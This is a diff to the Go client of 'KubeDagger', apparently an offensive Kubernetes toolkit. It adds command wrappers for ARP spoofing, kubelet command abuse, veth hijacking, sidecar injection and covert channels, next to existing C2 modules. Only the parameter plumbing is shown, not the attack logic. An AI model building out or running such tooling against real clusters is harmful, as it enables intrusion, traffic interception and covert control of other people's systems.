@@ -64,6 +64,11 @@ import (
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/container_log_c2"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tcp_stego"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/doh_c2"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/covert_chan"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/arp_spoof"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/kubelet_abuse"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/veth_hijack"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/sidecar_inject"
 )
 
 func addFSWatchCmd(cmd *cobra.Command, args []string) error {
@@ -398,6 +403,31 @@ func tcpStegoCmd(cmd *cobra.Command, args []string) error {
 func dohC2Cmd(cmd *cobra.Command, args []string) error {
 	logrus.SetLevel(options.LogLevel)
 	return doh_c2.Execute(options.Target, options.DoHC2Resolver, options.DoHC2Domain, options.Output)
+}
+
+func covertChanCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return covert_chan.Execute(options.Target, options.CovertChanType, options.CovertChanDest, options.CovertChanData, options.Output)
+}
+
+func arpSpoofCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return arp_spoof.Execute(options.Target, options.ARPVictimIP, options.ARPGatewayIP, options.ARPInterface, options.Output)
+}
+
+func kubeletAbuseCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return kubelet_abuse.Execute(options.Target, options.KubeletAction, options.KubeletNode, options.KubeletPod, options.KubeletCommand, options.Output)
+}
+
+func vethHijackCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return veth_hijack.Execute(options.Target, options.VethSourcePod, options.VethDestPod, options.VethMode, options.Output)
+}
+
+func sidecarInjectCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return sidecar_inject.Execute(options.Target, options.SidecarPod, options.SidecarImage, options.SidecarNamespace, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
